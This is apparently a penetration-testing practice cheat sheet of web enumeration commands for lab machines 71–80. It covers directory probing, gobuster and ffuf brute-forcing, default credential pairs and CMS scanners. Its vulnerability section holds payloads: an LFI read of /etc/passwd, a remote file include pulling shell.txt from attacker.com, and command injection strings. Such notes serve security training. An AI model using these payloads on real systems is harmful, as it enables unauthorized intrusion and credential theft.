## 🌐 Web Enumeration (Machines 71–80)

### Common Directories & Endpoints
```bash
curl -I http://<IP>/admin.php             # Check for admin panels
curl -I http://<IP>/config.php            # Exposed config files
curl -I http://<IP>/backup                # Backup archives
curl -I http://<IP>/.git/                 # Exposed .git directory
curl -I http://<IP>/uploads               # Check for upload directories
```

### Directory Bruteforce
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

### Default Credentials & Login Portals
```bash
admin:admin
admin:password
user:password
wpscan --url http://<IP> --enumerate u    # WordPress user enumeration
joomscan --url http://<IP>                # Joomla default paths
```

### Vulnerability Checks
```bash
# LFI Test
curl http://<IP>/index.php?file=../../../../etc/passwd

# RFI Test
curl http://<IP>/index.php?file=http://attacker.com/shell.txt

# Command Injection
curl http://<IP>/vuln.php?arg=;id
curl http://<IP>/vuln.php?arg=|whoami
```

### Technologies and Frameworks
```bash
whatweb http://<IP>
wappalyzer http://<IP>
```

### Notes from Machines 71–80:
- Multiple machines exposed `/admin/`, `/uploads/`, or `.git/` directories.
- Several login portals accepted weak credentials.
- LFI was found in at least two machines with classic `?file=...` parameters.
- Web tech stack included PHP, WordPress, and Nginx across several targets.
